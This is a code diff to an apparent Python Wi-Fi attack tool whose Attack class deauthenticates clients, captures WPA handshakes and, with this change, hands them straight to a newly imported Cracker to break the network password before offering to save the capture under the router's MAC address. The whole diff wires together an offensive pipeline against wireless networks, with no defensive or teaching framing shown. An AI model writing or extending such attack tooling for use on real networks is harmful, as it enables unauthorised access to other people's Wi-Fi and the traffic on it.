@@ -8,6 +8,7 @@ from multiprocessing import Process
 from glob import glob
 from check_handshake import checkHandshake
 import signal
+from cracker import Cracker
 
 class Attack(object):
 	"""docstring for Attack"""
@@ -36,17 +37,14 @@ class Attack(object):
 		self.search_client()
 		# self.convert_cap_hccap()
 		# if the above loop ended, then close everything
-		print("search client stopped")
 		self.hs.terminate() #terminate hash capture
 		self.hs.join()
 		self.verifier.cancel() # cancel handshake verifier
-		print("verifier stopped")
 		t.stop() # stop the deauther
-		print("deauther stopped")
+		self.ENGINE.exit()
 
 
 	def search_client(self):
-		
 		try:
 			print(colors.O + "[+]" + colors.W + " Searching for clients...")
 			timeout = time.time() + 60*2
@@ -59,7 +57,7 @@ class Attack(object):
 					
 			if(self.hasHandshake):
 				print(colors.BOLD+colors.O + "[+]" + colors.W +colors.BOLD+" Captured handshake successfully!" + colors.W)
-				self.ENGINE.exit()
+				self.call_cracker()
 			else:
 				print(colors.O + "[-]" + colors.W + " Timeout")
 		except KeyboardInterrupt:
@@ -132,6 +130,21 @@ class Attack(object):
 		except:
 			pass
 
+
+	def call_cracker(self):
+		print(colors.B + "[+]" + colors.W + " Trying to crack the passwords.")
+		time.sleep(1)
+		print(colors.O + "[-]" + colors.W + " Starting the cracker")
+		time.sleep(3)
+		x = Cracker()
+		x.crack()
+		# after cracking done ask user to save file 
+
+		choice = input(colors.O + "[-]" + colors.W + " Do you want to save the handshake? (y/n): ")
+		if(choice.lower() == 'y'):
+			file = glob("capture*.cap")[0]
+			os.rename(file, f"{self.targetRouterMac}_hs.cap")
+			print(colors.O + "[+]" + colors.W + f" Handshake saved: {self.targetRouterMac}_hs.cap")
 
 
 
